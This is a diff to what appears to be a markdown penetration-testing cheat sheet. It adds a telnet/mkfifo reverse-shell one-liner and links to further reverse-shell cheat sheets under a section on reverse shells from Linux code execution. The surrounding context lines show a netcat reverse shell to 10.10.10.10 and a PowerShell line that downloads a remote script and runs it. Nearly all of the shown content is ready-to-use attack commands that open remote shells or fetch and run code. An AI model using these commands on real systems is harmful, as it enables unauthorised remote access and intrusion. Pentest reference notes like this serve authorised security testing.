@@ -656,9 +656,17 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Inv
 
 ### Reverse shells from code execution on Linux
 
+- nc  
 ```
 nc 10.10.10.10 1337 -e /bin/bash
 ```
+
+- telnet  
+```
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet $IP $PORT > f
+```
+
+More [here](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) and [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  
 
 ## Active Directory
 
